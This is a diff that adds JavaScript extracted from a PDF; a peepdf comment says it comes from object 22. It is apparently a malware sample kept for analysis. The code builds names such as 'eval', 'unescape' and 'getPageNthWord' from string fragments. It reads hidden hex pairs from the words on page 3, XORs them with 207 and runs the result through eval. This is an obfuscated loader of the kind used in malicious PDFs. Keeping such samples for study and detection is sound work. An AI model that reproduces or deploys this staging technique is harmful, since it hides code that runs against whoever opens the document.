@@ -1,0 +1,37 @@
+// peepdf comment: Javascript code located in object 22 (version 0)
+
+								var eP = ["l", "v", "", "e", "a"];
+								f = new String(eP[3] + eP[1] + eP[4] + eP[0] + eP[2]);
+								var p = ["", "geNth", "Word", "getPa"];
+								v = new String(p[3] + p[1] + p[2] + p[0]);
+								var t = ["eNu", "rds", "mWo", "get", "Pag", ""];
+								pE = new String(t[3] + t[4] + t[0] + t[2] + t[1] + t[5]);
+								var mX = ["n", "u", "e", "a", "s", "c", "", "p", "e"];
+								n = new String(mX[1] + mX[0] + mX[2] + mX[4] + mX[5] + mX[3] + mX[7] + mX[2] + mX[6]);
+								var pA = ["cha", "t", "", "rCo", "deA"];
+								wJ = new String(pA[0] + pA[3] + pA[4] + pA[1] + pA[2]);
+								var vS = ["", "de", "fromC", "harCo"];
+								wN = new String(vS[2] + vS[3] + vS[1] + vS[0]);
+								var l = ["p", "p", "", "a"];
+								x = new String(l[3] + l[0] + l[0] + l[2]);
+								var z = this;
+								var tY = String("swo%".substr(3));
+								var gR = 2;
+								var xI = String;
+								var mN = 0;
+								var b = 207;
+								var x = z[x];
+								var tK = 3;
+								var iR = z[n];
+								var h = z[pE](tK);
+								var lE = "";
+								for (var uL = mN; uL < h; uL += 1) {
+								    zC = z[v](tK, uL);
+								    var wR = zC.substr(zC.length - gR, gR);
+								    var lU = iR(tY + wR);
+								    var iRC = lU[wJ](mN);
+								    var cP = iRC ^ b;
+								    lE += xI[wN](cP);
+								}
+								this[f](lE);
+
